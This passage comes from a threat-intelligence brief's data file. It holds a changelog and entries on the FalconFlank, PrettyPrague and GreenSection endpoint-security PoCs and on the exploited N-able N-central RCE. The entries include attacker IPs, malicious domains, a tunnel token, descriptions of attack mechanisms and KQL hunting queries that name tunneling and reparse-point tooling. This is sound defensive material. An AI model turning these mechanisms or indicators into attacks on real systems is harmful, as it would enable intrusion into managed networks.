  "now": "39 stories for the week of Aug 31 – Sep 6, 2026. Dropped as aged out, not as corrections: GiveWP CVE-2026-82222, Cosmos EVM, cPanel CVE-2026-65643, GeoServer, the Next.js August release, the Aug 27 KEV batch (Aug 30 deadlines passed; the JFrog CVE-2026-66384 Sep 10 deadline is carried in the new Artifactory entry), Manchester Airports Group, TeamPCP, ATF/Qilin, Avada, Elementor Pro, miniOrange SAML SSO and MLflow. Added SonicWall SMA1000, JFrog Artifactory CVE-2026-82329, Langflow CVE-2026-0768, the Virtualizor BGP hijack, WatchGuard Fireware iked and OpenAI Astra. The outgoing edition is archived as 2026-W35"
 },
 {
  "date": "Sep 2, 2026",
  "item": "PaperCut — assessment escalated",
  "was": "CVE-2026-82078 and CVE-2026-81578 exploited as a zero-day; not in the KEV catalog; watchTowr reported bypasses of the first emergency patch",
  "now": "Both CVEs added to KEV on Aug 31, 2026 under BOD 26-04 with the Forensics Triage Requirements applying, and SecurityWeek reports exploitation escalating from scanning and probing to active intrusions. Prior guidance to hunt archived server.log copies stands and now carries a compliance obligation for federal assets"
 },
 {
  "date": "Sep 2, 2026",
  "item": "JFrog Artifactory — two distinct CVEs, do not conflate",
  "was": "Last week's brief carried one Artifactory issue: CVE-2026-66384, path traversal, KEV-listed Aug 27 with a Sep 10 federal deadline",
  "now": "CVE-2026-82329 is a separate authentication bypass to administrative access, patched Aug 28 and reported exploited by watchTowr on Sep 1; it is not in KEV. Both need remediation, and the fixed-version lists differ. CVE-2026-66384 is also the flaw OpenAI says one of its models exploited against Hugging Face"
 },
 {
  "date": "Aug 30, 2026",
  "item": "Intel refresh — two stories added",
  "was": "44 stories covering the week to Aug 29",
  "now": "46 stories. Added Rhysida's extortion of the Berlin state government (leak-site auction Aug 28, ransom refused) and Executive Order 14420 on foreign-produced bulk-power system equipment. Candidates already covered by existing entries — cPanel CVE-2026-65643, Citrix NetScaler CVE-2026-8452, the Aug 26 and Aug 27 KEV batches, Gitea exposure counts, ServiceNow AI Platform and McKesson — were checked and not duplicated"
 },
 {
  "date": "Aug 29, 2026",
  "item": "NovaCookies added (user-supplied source)",
  "was": "Not previously carried",
  "now": "Added from Island Security Research's Aug 26, 2026 analysis. Five example domains recorded as indicators with the full 755-domain versioned release referenced; Island's caveats on targeting-versus-compromise and on brand-themed hostnames not implying compromise of the named companies are carried in the record."
 },
 {
  "date": "Aug 29, 2026",
  "item": "Intel refresh — six stories added",
  "was": "31 stories covering the week to Aug 28",
  "now": "37 stories. Added PaperCut CVE-2026-82078/81578, ownCloud CVE-2023-49105 exploitation detail, ZBT SPEAKINGSTONE/DARKLANTERN, ServiceNow AI Platform, cPanel CVE-2026-65643 and GeoServer jsonArrayContains. No stories removed this pass — pruning and archiving are held for the Monday rollover."
 },
 {
  "date": "Aug 29, 2026",
  "item": "CISA KEV Aug 27 batch (kevaug27)",
  "was": "Carried as a KEV listing with no published exploitation detail",
  "now": "Exploitation detail now published for two of the three: the ownCloud entry is covered in a dedicated write-up, and OpenAI has stated its own AI agents exploited the Artifactory (CVE-2026-66384) and Linux kernel (CVE-2026-53362) flaws against its internal infrastructure. Federal deadlines unchanged: Aug 30 for ownCloud and the Linux kernel, Sep 10 for Artifactory."
 },
 {
  "date": "Aug 29, 2026",
  "item": "GeoServer jsonArrayContains",
  "was": "Not previously carried; reported on Aug 12–15 as an unpatched zero-day",
  "now": "Carried as patched. GeoServer 3.0.1, 2.28.5 and 2.27.6 contain the fix, tracked as GHSA-mqjf-5f49-2fjh at CVSS 9.8. No CVE identifier has been assigned."
 },
 {
  "date": "Aug 28, 2026",
  "item": "Duplicate entries removed",
  "was": "Gitea CVE-2026-60004 carried two story entries sharing one identical detail record, and CISA’s Aug 26 KEV batch was written up twice (a six-item roundup and a legacy-CVE analysis), duplicating six CVE rows",
  "now": "One Gitea entry retained; the Aug 26 KEV batch is now covered by the legacy-CVE analysis plus the dedicated Citrix NetScaler CVE-2026-8452 write-up"
 },
 {
  "date": "Aug 28, 2026",
  "item": "CVE-2015-3246",
  "was": "Carried as CVSS 7.8 in the removed KEV roundup",
  "now": "CVSS 5.1 (Red Hat libuser race condition), per the published score"
 },
 {
  "date": "Aug 28, 2026",
  "item": "macOS Screen Sharing CVE-2026-65400",
  "was": "Described as not yet KEV-listed despite confirmed exploitation",
  "now": "KEV addition confirmed Aug 22, 2026; the story and CVE row now agree"
 },
 {
  "date": "Aug 28, 2026",
  "item": "Microsoft OOB (Aug 7)",
  "was": "Carried as an open item, dated by relative reference (“last Friday’s emergency release”)",
  "now": "Removed as aged out and superseded: the SharePoint CVE-2026-55040 / CVE-2026-63520 chain is tracked in its own entry; the three CVSS 10.0 cloud flaws were mitigated service-side with no customer action"
 },
 {
  "date": "Aug 28, 2026",
  "item": "Relative date language (all items)",
  "was": "Several entries used “today”, “tomorrow”, “last Friday” and “earlier this week”, which decay after publication",
  "now": "All replaced with absolute dates"
 },
 {
  "date": "Aug 27, 2026",
  "item": "Gitea CVE-2026-60004",
  "was": "Two separate entries dated the CISA KEV addition Aug 25 and Aug 26, and shared one detail record",
  "now": "KEV addition confirmed as Aug 25, 2026 with an Aug 28 federal deadline; the two entries are now tracked separately (initial disclosure and the exploitation follow-up)"
 },
 {
  "date": "Aug 1, 2026",
  "item": "JadePuffer",
  "was": "Entry vulnerability cited as CVE-2026-0770 / CVE-2026-55255",
  "now": "Corrected to CVE-2025-3248 (Langflow /api/v1/validate/code unauthenticated RCE), per Sysdig"
 },
 {
  "date": "Jul 31, 2026",
  "item": "CVE-2026-63077",
  "was": "Described as an MCP bridge / agent polling container RCE",
  "now": "Corrected to JetBrains TeamCity On-Premises unauthenticated RCE via the agent polling protocol"
 },
 {
  "date": "Aug 1, 2026",
  "item": "IOC handling (all items)",
  "was": "Several entries pointed to vendor advisories instead of listing indicators",
  "now": "Concrete defanged IOCs now listed inline where publicly available; items with genuinely no public IOCs say so explicitly"
 }
],
  D: {
 "falconflank": {
  "eyebrow": "Nightmare Eclipse · FalconFlank / PrettyPrague / GreenSection · No CVEs · Public PoCs Sep 3–7, 2026",
  "title": "One researcher, four endpoint-security and driver drops in three weeks, and vendors answering at different speeds",
  "tags": [
   [
    "high",
    "All Sectors"
   ],
   [
    "med",
    "Information Technology"
   ]
  ],
  "overview": "Two things separate this from an ordinary local privilege escalation. First, the vulnerable component is a control organisations deliberately enabled: Falcon's malicious-macro removal runs with elevated privileges, and the reported path turns that cleanup into an attacker's write primitive. The vendor's interim advice is to disable that policy setting, so the mitigation is a reduction in the protection people bought. Weigh that against local-only access as the prerequisite, and against CrowdStrike's statement that Cloud Anti-malware for Microsoft Office Files continues to apply. Second, this is a research drop rather than a confirmed vulnerability. CrowdStrike is investigating; there is no CVE, no CVSS, no fix, and no independent reproduction of the resulting privilege level. Foresiet, which reviewed the repository without executing it, is explicit that the \"0-day\" label is the author's claim. Sources also disagree on the affected Windows builds — the researcher says Windows 11 25H2 and Server 2025, Rescana says Windows 11 and Server 2026 — so scope is not settled. Note this lands alongside ShieldBreak, the unpatched Defender SYSTEM-execution issue already tracked in this brief; the shared shape is a privileged endpoint-security process being made to act on attacker-controlled files.",
  "technical": [
   "Published Sep 3, 2026 by a researcher operating as Nightmare Eclipse, also known as Chaotic Eclipse and MSNightmare, as the GitHub project MSNightmare/FalconFlank. README: \"FalconFlank is a 0day privilege escalation that abuses the office malicious macros remediation in Crowdstrike Falcon Sensor.\"",
   "Reported mechanism: Falcon's removal of malicious Microsoft Office macros during remediation runs with elevated privileges. The claimed flaw is that a lower-privileged local user can cause that workflow to handle attacker-controlled files unsafely — an unsafe path resolution, security descriptor, race condition or similar trust-boundary failure — escalating to SYSTEM. SOCRadar notes the precise root cause is undocumented and no CWE has been assigned.",
   "Repository contents per Foresiet's review: C++ source, a Visual Studio project, an embedded Office-document decoy, an embedded library payload and a precompiled 64-bit executable; the code interacts with named pipes, reparse points, DLL operations and Windows system APIs. Foresiet did not execute the binary or test it against a live sensor.",
   "Preconditions: the \"Microsoft Office file malicious macro removal\" capability must be enabled. Truesec places the working configuration at Falcon Phase 3 Optimal Protection with that setting on.",
   "Affected-version divergence: the researcher states the PoC works on a fully updated Windows 11 25H2 machine or Windows Server 2025; Rescana reports Falcon Sensor for Windows on fully updated Windows 11 and Windows Server 2026. Treat the scope as unsettled.",
   "The researcher notes CrowdStrike likely already detects the released code, so testing requires adding exclusions or obfuscating the PoC and changing the DLL load technique — an acknowledgement that detection of this exact artefact does not address the underlying path.",
   "Vendor position: a CrowdStrike spokesperson told The Hacker News the company is \"actively investigating these claims\" and advised customers to disable the Microsoft Office File Suspicious Macro Removal Windows policy setting, adding that customers remain protected through the Cloud Anti-malware for Microsoft Office Files settings, and referring customers to a FalconFlank Tech Alert in the support portal.",
   "Status as of Sep 3, 2026 per SOCRadar: no CrowdStrike confirmation of the flaw, no CVE, no CVSS score and no fix. Rescana adds it is not in CISA KEV. No exploitation in the wild has been reported.",
   "Update Sep 7, 2026 (SecurityWeek): within a short window the researcher dropped three exploits — FalconFlank (CrowdStrike Falcon Sensor), PrettyPrague (Avast sandbox) and GreenSection (Nvidia). This follows HardBreacher, a privilege escalation zero-day in a Kaspersky endpoint security product released in late August and patched by Kaspersky on Aug 31.",
   "PrettyPrague: PoC code targeting the Avast sandbox to spawn a shell with full system privileges; the researcher says it may also affect other GenDigital products including AVG and Norton. A GenDigital spokesperson told SecurityWeek the company was recently made aware of a vulnerability affecting a subset of Gen products including Avast Antivirus that could allow privilege elevation, and that it has fixed the issue.",
   "GreenSection: an out-of-bounds memory write affecting a shared global memory section used by multiple Nvidia user-mode components. The researcher states it \"does not get SYSTEM privileges immediately\" but \"can be used cross user to user boundary easily or even compromise the dwm.exe process,\" and that he did not investigate further. SecurityWeek emailed Nvidia and had no statement at publication.",
   "Independent verification: security researcher Kevin Beaumont said late in the week that the Avast, CrowdStrike and Kaspersky exploits work. That is the first third-party confirmation that the code functions, though it does not settle the affected-version scope for FalconFlank."
  ],
  "iocs": [
   {
    "type": "Actor Alias",
    "value": "Nightmare Eclipse / Chaotic Eclipse / MSNightmare",
    "note": "Researcher who published the PoC — not a threat actor; recorded because reporting uses all three names"
   },
   {
    "type": "URL",
    "value": "github.com/MSNightmare/FalconFlank",
    "note": "Repository hosting the proof-of-concept source and a precompiled 64-bit executable"
   },
   {
    "type": "Behavior",
    "value": "Unauthorized DLL writes into C:\\Windows\\System32 or other protected system directories",
    "note": "SOC Prime advises monitoring for this; detected unauthorized DLL creation in System32 warrants immediate host isolation"
   },
   {
    "type": "Behavior",
    "value": "Unexpected Windows Error Reporting tasks or unexplained file writes inside protected system folders",
    "note": "SOC Prime hunting guidance for this class of remediation abuse"
   },
   {
    "type": "Behavior",
    "value": "Privilege escalation or child-process activity originating from an endpoint-security process",
    "note": "SOC Prime advises treating privilege escalation attempts originating from security products as high priority"
   },
   {
    "type": "Behavior",
    "value": "Macro-remediation events immediately followed by local privilege changes on the same host",
    "note": "Correlation of the remediation trigger with the escalation outcome; audit recent macro-related activity"
   },
   {
    "type": "URL",
    "value": "github.com/MSNightmare/PrettyPrague",
    "note": "Repository hosting the Avast sandbox privilege escalation PoC"
   },
   {
    "type": "URL",
    "value": "github.com/MSNightmare/GreenSection",
    "note": "Repository hosting the Nvidia shared-memory out-of-bounds write PoC"
   }
  ],
  "iocNote": "No campaign indicators exist — this is a public research release, not an observed intrusion, and there is no confirmed exploitation. The entries above are detection surfaces drawn from SOC Prime's published guidance and from the mechanism, plus the repository reference. No file hashes are recorded: the PoC is attacker-buildable source, and hashing the published binary would produce an indicator any recompilation defeats.",
  "mitigation": [
   "Update Gen products — Avast, AVG and Norton — to current versions: GenDigital states it has fixed the PrettyPrague issue.",
   "Apply CrowdStrike's interim guidance: disable the Microsoft Office File Suspicious Macro Removal Windows prevention policy setting. Truesec advises doing so as soon as possible.",
   "Confirm Cloud Anti-malware for Microsoft Office Files remains enabled — CrowdStrike states customers stay protected through that setting while the macro-removal policy is off.",
   "Consult the FalconFlank Tech Alert in the CrowdStrike support portal for the vendor's current position, and track it for a confirmation, CVE assignment or sensor update.",
   "Review Falcon exclusions: the researcher notes testing the PoC requires exclusions or DLL-load changes, so broad or stale exclusions both weaken detection and complicate assessing exposure.",
   "Prioritise hosts where unprivileged local access is expected — shared workstations, VDI, CI runners, developer machines — since local access is the prerequisite.",
   "Record the decision. Turning off a prevention control to mitigate a research claim is a risk trade, and it needs an owner and a review date tied to the vendor's investigation.",
   "Treat this alongside ShieldBreak (Defender SYSTEM execution, unpatched): if both products are deployed across the estate, review endpoint-security remediation paths as a single exposure rather than two vendor tickets.",
   "Track Nvidia for a response on GreenSection; no vendor statement existed at publication, and the researcher describes a cross-user primitive rather than direct SYSTEM."
  ],
  "response": [
   "DEFENDER XDR KQL — hunting is for the outcome, not the artefact: a privileged security-product process writing DLLs into protected directories, then a local privilege change on the same host. Technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// FalconFlank-class abuse — remediation-path writes and escalation\nlet since = datetime(2026-09-01);\nlet secProcs = dynamic([\"CSFalconService.exe\",\"CSFalconContainer.exe\",\"MsMpEng.exe\",\"MpDefenderCoreService.exe\"]);\nunion isfuzzy=true\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FileName endswith \".dll\"\n   | where FolderPath has_any (@\"C:\\Windows\\System32\", @\"C:\\Windows\\SysWOW64\", @\"C:\\Program Files\\CrowdStrike\")\n   | where InitiatingProcessTokenElevation != \"TokenElevationTypeLimited\"\n   | project Timestamp, DeviceName, Leg = \"protected DLL write\", Evidence = strcat(InitiatingProcessFileName, \" wrote \", FolderPath, FileName)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName in~ (secProcs)\n   | where FileName has_any (\"cmd.exe\",\"powershell.exe\",\"rundll32.exe\",\"regsvr32.exe\")\n   | project Timestamp, DeviceName, Leg = \"security process spawned shell\", Evidence = strcat(InitiatingProcessFileName, \" -> \", ProcessCommandLine)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where ProcessIntegrityLevel == \"System\"\n   | where InitiatingProcessAccountName !in~ (\"system\",\"local service\",\"network service\")\n   | project Timestamp, DeviceName, Leg = \"unprivileged-to-SYSTEM transition\", Evidence = strcat(InitiatingProcessAccountName, \" -> \", FileName, \" \", ProcessCommandLine)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FileName endswith \".docm\" or FileName endswith \".xlsm\" or FileName endswith \".dotm\"\n   | where FolderPath has_any (\"\\\\Temp\\\\\",\"\\\\AppData\\\\\",\"\\\\Users\\\\Public\\\\\")\n   | project Timestamp, DeviceName, Leg = \"macro decoy staged\", Evidence = strcat(ActionType, \" \", FolderPath, FileName))\n| summarize Legs = make_set(Leg), Events = count(), First = min(Timestamp), Last = max(Timestamp), Detail = make_set(Evidence, 8) by DeviceName\n| where array_length(Legs) > 1\n| sort by Last desc",
   "SENTINEL KQL — the reparse-point and named-pipe primitives the PoC uses, plus Windows Error Reporting anomalies SOC Prime flags, sit in host event logs rather than in EDR tables.\n\n// Reparse points, pipes and WER anomalies on hosts running the affected sensor\nlet since = datetime(2026-09-01);\nunion isfuzzy=true\n  (SecurityEvent\n   | where TimeGenerated > since\n   | where EventID == 4688\n   | where CommandLine has_any (\"mklink\",\"fsutil reparsepoint\",\"\\\\\\\\.\\\\pipe\\\\\")\n   | project TimeGenerated, Host = Computer, Leg = \"link or pipe primitive\", Evidence = strcat(Account, \": \", CommandLine)),\n  (SecurityEvent\n   | where TimeGenerated > since\n   | where EventID in (4672, 4673, 4674)\n   | where Account !endswith \"$\"\n   | project TimeGenerated, Host = Computer, Leg = \"sensitive privilege assigned\", Evidence = strcat(Account, \" \", Activity)),\n  (Event\n   | where TimeGenerated > since\n   | where Source has_any (\"Windows Error Reporting\",\"Application Error\")\n   | where RenderedDescription has_any (\"CSFalcon\",\"macro\",\"Office\")\n   | project TimeGenerated, Host = Computer, Leg = \"WER anomaly\", Evidence = RenderedDescription)\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 6) by Host, Leg\n| sort by Last desc",
   "If unauthorized DLL creation in C:\\Windows\\System32 is confirmed, SOC Prime advises isolating the host immediately rather than triaging in place.",
   "Audit recent macro-related remediation activity on hosts that had the setting enabled, and correlate each event against local privilege changes in the same window — that pairing is the only evidence that distinguishes the reported path from routine cleanup."
  ],
  "source": "MSNightmare GitHub repositories (FalconFlank, PrettyPrague, GreenSection), SecurityWeek (Sep 7, 2026), Kevin Beaumont via cyberplace.social, The Hacker News, BleepingComputer, Truesec, SOCRadar, Rescana, Foresiet, SOC Prime, CybersecurityNews",
  "sourceNote": "Sep 3 – Sep 7, 2026"
 },
 "ncentral86218": {
  "eyebrow": "N-able N-central · CVE-2026-86218 · CVSS 10.0 · Exploited zero-day · HF4 Sep 6, 2026",
  "title": "Third hotfix cycle in five weeks on the same RMM, and the vendor's own two statements do not agree",
  "tags": [
   [
    "crit",
    "Information Technology"
   ],
   [
    "crit",
    "All Sectors"
   ]
  ],
  "overview": "This is the week's most urgent patch. N-central is MSP infrastructure: one compromised console can push scripts and jobs to every managed endpoint across every downstream customer, deploy tunnels through the agent, and open remote-control sessions into domain controllers. CVE-2026-86218 is pre-auth RCE at CVSS 10.0, and it is unrelated to the two CVEs patched the day before — so HF3 is not a stopping point; HF4 is. Two details deserve attention beyond the version number. First, N-able's own communications conflict: the MSPGeek post and the Active Incident page say the flaw has been observed exploited in the wild and Jason Murphy explicitly called it a zero day, while the HF4 release notes say there are no confirmations of exploitation in production. Treat the exploitation claim as the planning basis. Second, Huntress's investigation started from a fully patched customer environment that was compromised, and appliance logs had already rotated — so nobody can currently say which of the three flaws was used. That log-retention gap is the reason to hunt rather than to assume patch state settles it. Huntress also notes N-central appliances run a custom AlmaLinux distribution and often carry no EDR, which is why the appliance's own logs are the primary evidence source.",
  "technical": [
   "CVE-2026-86218 (CVSS 10.0): pre-authentication remote code execution in N-able N-central. Fixed in N-central 2026.3 Hotfix 4, published Sep 6, 2026, which supersedes Hotfix 3 (build 2026.3.1.13). Hosted NCOD instances were patched by N-able; on-premises deployments must apply HF4.",
   "N-able's Jason Murphy, MSPGeek Discord: after the two earlier disclosures, \"a third, independent researcher alerted us to a new vulnerability that has been exploited in the wild that is unrelated to the previously disclosed CVEs,\" described as a critical zero-day allowing pre-authenticated access to the N-central server. In follow-up he stated \"this one is a Zero day.\"",
   "Contradiction on record: the MSPGeek post and N-able's Active Incident page (uptime.n-able.com/event/201814/) state the vulnerability has been observed exploited in the wild; the HF4 release notes state \"At this time, we have no confirmations that this vulnerability has been exploited in production environments, but unpatched systems remain at risk.\"",
   "CVE-2026-86206 and CVE-2026-86207 (Sep 5): Huntress reproduced and validated a proof of concept for an authentication-bypass chain working against N-central 2026.3.1.10, granting full control over user management including creation of unauthorized administrative accounts. Distinct from the August flaws CVE-2026-18556 and CVE-2026-18577 (the latter described as an incomplete patch for the former, allowing authentication bypass and account takeover through 2026.3.1). Fixed in HF3 (2026.3.1.13).",
   "Origin of the investigation: Huntress began on Sep 4 after a customer's fully patched N-central production environment was compromised. Limited historical logging on the appliance means Huntress cannot confirm which vulnerability the actor used, and cannot rule out alternatives — including CVE-2026-86218.",
   "Tradecraft, September activity: account-name manipulation appending unexpected strings such as .invalid to known N-able email addresses during user creation, plus subtle character swaps and spoofed domains; reconnaissance probes against /remoteControlAction.do?method=getPierDetails with specific appliance IDs to map the environment before exploitation. Unlike the August campaign, which abused the Take Control feature, this activity targets the underlying API and appliance logs.",
   "Tradecraft, August campaign: administrative access to the console followed by abuse of the built-in Take Control feature to pivot into managed endpoints and deploy Cloudflare-based tunnels for persistence. Huntress observed strategic reconnaissance prioritising domain controllers, a process list request after exploitation, then rapid lateral movement across hosts. Windows Application Event IDs 4102, 8192 and 8193 recorded the malicious \"MSP Support\" session and the Take Control session start and end.",
   "Huntress worked with Cloudflare to disable the adversary's existing tunnels, assessing that exploitation predating its discovery likely used the same account token, so the takedown closes those backdoors across affected environments.",
   "N-able release notes also advised reviewing users' documents folders for files named svchost.exe and checking for a registered service named Cloudflared; Huntress had not seen either in its telemetry as of the Aug 3 update.",
   "Patch-rate context from August: at one point 55.6% of reachable cloud servers in Huntress's partner base were unpatched, falling to roughly 13.6% of all reachable servers, with self-hosted lagging at 28.6%."
  ],
  "iocs": [
   {
    "type": "IP",
    "value": "23.234.100.105",
    "note": "Intruder IPv4, Tzulo VPN — September activity (Huntress, Sep 5 update)"
   },
   {
    "type": "IP",
    "value": "23.234.97.68",
    "note": "Intruder IPv4, Tzulo VPN — September activity (Huntress, Sep 5 update)"
   },
   {
    "type": "String",
    "value": "5568cd69c754b392121f1dbb8f900fda",
    "note": "Malicious Cloudflare tunnel account tag — Huntress worked with Cloudflare to disable tunnels using this token"
   },
   {
    "type": "URL",
    "value": "/remoteControlAction.do?method=getPierDetails",
    "note": "Reconnaissance endpoint probed with specific appliance IDs during initial staging, ahead of exploitation"
   },
   {
    "type": "String",
    "value": ".invalid",
    "note": "Appended to known N-able email addresses during unauthorized user creation; also watch for character swaps and spoofed domains in login names"
   },
   {
    "type": "IP",
    "value": "173.249.252.200",
    "note": "N-able August 1 security update; associated with Mullvad or Nord VPN exit nodes"
   },
   {
    "type": "IP",
    "value": "87.249.138.34",
    "note": "N-able August 1 update; Huntress attributes substantial traffic to NordVPN"
   },
   {
    "type": "IP",
    "value": "37.19.210.32",
    "note": "N-able August 1 update; attributed to Mullvad VPN and previously abused for brute forcing and spam"
   },
   {
    "type": "IP",
    "value": "68.235.46.214",
    "note": "N-able August 1 security update"
   },
   {
    "type": "IP",
    "value": "37.153.90.88",
    "note": "N-able August 2 security update"
   },
   {
    "type": "IP",
    "value": "92.118.112.181",
    "note": "N-able August 2 security update"
   },
   {
    "type": "IP",
    "value": "173.249.252.176",
    "note": "N-able August 6 security update"
   },
   {
    "type": "IP",
    "value": "185.156.46.150",
    "note": "N-able August 6 security update"
   },
   {
    "type": "IP",
    "value": "23.234.94.43",
    "note": "N-able August 6 security update"
   },
   {
    "type": "IP",
    "value": "68.235.46.235",
    "note": "N-able August 6 security update"
   },
   {
    "type": "Domain",
    "value": "mousears.synology.me",
    "note": "Known malicious domain (Huntress IOC table)"
   },
   {
    "type": "Domain",
    "value": "wagoosh.direct.quickconnect.to",
    "note": "Known malicious domain (Huntress IOC table)"
   },
   {
    "type": "Domain",
    "value": "who-ripped-one.direct.quickconnect.to",
    "note": "Known malicious domain (Huntress IOC table)"
   },
   {
    "type": "Filename",
    "value": "svchost.exe in a user's Documents folder",
    "note": "N-able release notes advised reviewing for this; Huntress had not observed it in telemetry as of Aug 3"
   },
   {
    "type": "String",
    "value": "Cloudflared",
    "note": "Registered service name to check for, per N-able release notes — Cloudflare tunnel persistence"
   },
   {
    "type": "Behavior",
    "value": "Windows Application Event IDs 4102, 8192, 8193 with the \"MSP Support\" account",
    "note": "Malicious connection via MSP Support (the default N-central Take Control username) followed by Take Control session start and end"
   },
   {
    "type": "Filename",
    "value": "C:\\ProgramData\\GetSupportService_N-Central\\Logs\\BASupSrvc_*.log.gz",
    "note": "Take Control breadcrumb on managed Windows hosts — also created by legitimate use, so a pivot rather than proof"
   }
  ],
  "iocNote": "Indicators are published by Huntress and N-able and cover both the August Take Control campaign and the September API-focused activity. The August IP set is largely commercial VPN exit infrastructure (Mullvad, NordVPN, Tzulo), so it is low-fidelity for blocking and better used to scope which sessions to review; Huntress explicitly notes blocking the IOC set is a temporary, partial control because attackers rotate infrastructure. No indicators are attributed specifically to CVE-2026-86218 — log rotation on the compromised appliance prevented attribution.",
  "mitigation": [
   "Apply N-central 2026.3 Hotfix 4 immediately on all on-premises deployments, including any already on HF3 (2026.3.1.13). Hosted NCOD instances are patched by N-able.",
   "Do not treat HF3 as sufficient: CVE-2026-86218 is unrelated to the CVEs HF3 addressed.",
   "Restrict all inbound access to the N-central console — IP allow-listing or mandatory VPN, SSO where available, MFA on every account. Do not leave the console reachable from the public internet even after patching.",
   "Where the console is still broadly reachable and cannot be constrained quickly, Huntress advises considering temporarily disabling N-central, up to taking the server offline, until HF4 is applied and strict network controls are in place.",
   "Audit user lists and access controls for anomalous account creation and unexpected role changes, specifically the .invalid email anomaly and any newly created administrative users.",
   "Review recent Take Control and remote-control sessions for connections into domain controllers and file servers, viewer IPs outside help-desk ranges, and sessions that do not match a ticket.",
   "Review jobs and automation for new or modified jobs touching many endpoints at once and unrecognised scripts targeting domain controllers.",
   "Preserve appliance logs before they rotate — envoy_proxy_HTTPS.log and syslog ncentraldms are the primary evidence, and short retention is what blocked attribution in the Huntress case."
  ],
  "response": [
   "Hunt the appliance logs first. Filter envoy_proxy_HTTPS.log and syslog ncentraldms for successful requests to internal API routes containing URL-encoded values such as %2F, and for probes of /remoteControlAction.do?method=getPierDetails. Then audit newly created accounts for .invalid or other appended strings.",
   "DEFENDER XDR KQL — the appliance itself usually has no EDR, so endpoint telemetry is where downstream abuse shows: Take Control breadcrumbs, Cloudflare tunnel persistence, and the IOC infrastructure. Technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// N-central exploitation — downstream endpoint activity\nlet since = datetime(2026-08-01);\nlet ncIPs = dynamic([\"23.234.100.105\",\"23.234.97.68\",\"173.249.252.200\",\"87.249.138.34\",\"37.19.210.32\",\"68.235.46.214\",\"37.153.90.88\",\"92.118.112.181\",\"173.249.252.176\",\"185.156.46.150\",\"23.234.94.43\",\"68.235.46.235\"]);\nlet ncDomains = dynamic([\"mousears.synology.me\",\"wagoosh.direct.quickconnect.to\",\"who-ripped-one.direct.quickconnect.to\"]);\nunion isfuzzy=true\n  (DeviceNetworkEvents\n   | where Timestamp > since\n   | where RemoteIP in (ncIPs) or RemoteUrl has_any (ncDomains)\n   | project Timestamp, DeviceName, Leg = \"IOC infrastructure\", Evidence = strcat(RemoteIP, \" \", RemoteUrl, \" via \", InitiatingProcessFileName)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FolderPath has \"GetSupportService_N-Central\\\\Logs\" or FileName startswith \"BASupSrvc_\"\n   | project Timestamp, DeviceName, Leg = \"Take Control breadcrumb\", Evidence = strcat(ActionType, \" \", FolderPath, FileName)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FileName =~ \"svchost.exe\"\n   | where FolderPath has_any (\"\\\\Documents\\\\\",\"\\\\Downloads\\\\\")\n   | project Timestamp, DeviceName, Leg = \"masquerading binary\", Evidence = strcat(FolderPath, FileName)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where ProcessCommandLine has_any (\"cloudflared\",\"tunnel run\",\"--token\")\n   | project Timestamp, DeviceName, Leg = \"tunnel persistence\", Evidence = ProcessCommandLine),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (\"BASupSrvc\",\"BASupTSHelper\",\"AgentMonitor\",\"nagent\")\n   | where FileName has_any (\"powershell.exe\",\"cmd.exe\",\"tasklist.exe\",\"net.exe\",\"nltest.exe\")\n   | project Timestamp, DeviceName, Leg = \"RMM-spawned execution\", Evidence = strcat(InitiatingProcessFileName, \" -> \", ProcessCommandLine))\n| summarize Legs = make_set(Leg), Events = count(), First = min(Timestamp), Last = max(Timestamp), Detail = make_set(Evidence, 8) by DeviceName\n| sort by Last desc",
   "SENTINEL KQL — the console-side story: the Take Control event trio, the MSP Support account, and appliance or firewall traffic touching the IOC set. Technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// N-central console abuse — Take Control sessions and IOC traffic\nlet since = datetime(2026-08-01);\nlet ncIPs = dynamic([\"23.234.100.105\",\"23.234.97.68\",\"173.249.252.200\",\"87.249.138.34\",\"37.19.210.32\",\"68.235.46.214\",\"37.153.90.88\",\"92.118.112.181\",\"173.249.252.176\",\"185.156.46.150\",\"23.234.94.43\",\"68.235.46.235\"]);\nunion isfuzzy=true\n  (Event\n   | where TimeGenerated > since\n   | where EventLog =~ \"Application\"\n   | where EventID in (4102, 8192, 8193)\n   | project TimeGenerated, Host = Computer, Leg = strcat(\"Take Control event \", EventID), Evidence = RenderedDescription),\n  (SecurityEvent\n   | where TimeGenerated > since\n   | where Account has_any (\"MSP Support\",\"mspsupport@n-able.com\")\n   | project TimeGenerated, Host = Computer, Leg = \"MSP Support logon\", Evidence = strcat(Activity, \" from \", IpAddress)),\n  (SecurityEvent\n   | where TimeGenerated > since\n   | where EventID in (4720, 4728, 4732, 4756)\n   | where TargetAccount has_any (\".invalid\",\"n-able\")\n   | project TimeGenerated, Host = Computer, Leg = \"anomalous account creation\", Evidence = strcat(Activity, \" \", TargetAccount)),\n  (CommonSecurityLog\n   | where TimeGenerated > since\n   | where SourceIP in (ncIPs) or DestinationIP in (ncIPs)\n   | project TimeGenerated, Host = DeviceName, Leg = \"perimeter IOC traffic\", Evidence = strcat(SourceIP, \" -> \", DestinationIP, \":\", DestinationPort, \" \", RequestURL)),\n  (Syslog\n   | where TimeGenerated > since\n   | where SyslogMessage has_any (\"getPierDetails\",\"%2F\",\"ncentraldms\")\n   | project TimeGenerated, Host = Computer, Leg = \"appliance API anomaly\", Evidence = SyslogMessage)\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 6) by Host, Leg\n| sort by Last desc",
   "Because appliance logs rotate quickly, export envoy_proxy_HTTPS.log and syslog ncentraldms now on every N-central server, patched or not — that is the only record able to attribute which flaw was used.",
